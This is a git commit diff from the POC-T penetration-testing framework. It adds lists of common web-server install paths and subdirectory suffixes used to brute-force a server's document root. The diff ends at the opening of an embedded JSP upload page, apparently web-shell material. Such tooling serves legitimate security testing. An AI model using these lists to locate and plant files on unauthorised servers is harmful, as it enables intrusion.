54155dfd3cf59d3efe183fbc4fb88c6a764645cf
Xyntax <xyntax@163.com>
2016-07-21 18:04:41 -0400

    redis-web-probe

--- plugin/static.py
+++ plugin/static.py
@@ -3,6 +3,25 @@
 # author = i@cdxy.me
 # project = https://github.com/Xyntax/POC-T
 
+class ABSPATH_PREFIXES:
+    LINUX = (
+        "/var/www", "/usr/local/apache", "/usr/local/apache2", "/usr/local/www/apache22", "/usr/local/www/apache24",
+        "/usr/local/httpd", "/var/www/nginx-default", "/srv/www", "/var/www/vhosts",
+        "/var/www/virtual", "/var/www/clients/vhosts", "/var/www/clients/virtual")
+    WINDOWS = (
+        "/xampp", "/Program Files/xampp", "/wamp", "/Program Files/wampp", "/apache",
+        "/Program Files/Apache Group/Apache",
+        "/Program Files/Apache Group/Apache2", "/Program Files/Apache Group/Apache2.2",
+        "/Program Files/Apache Group/Apache2.4", "/Inetpub/wwwroot",
+        "/Inetpub/vhosts")
+    ALL = LINUX + WINDOWS
+
+
+# Suffixes used in brute force search for web server document root
+ABSPATH_SUFFIXES = (
+    "html", "htdocs", "httpdocs", "php", "public", "src", "site", "build", "web", "www", "data", "sites/all",
+    "www/build")
+
 JSP_UPLOAD = """<%@page contentType="text/html; charset=GBK" import="java.io.*;"%>
 <html><head><title>JSP</title></head><body bgcolor="#ffffff">
 <%
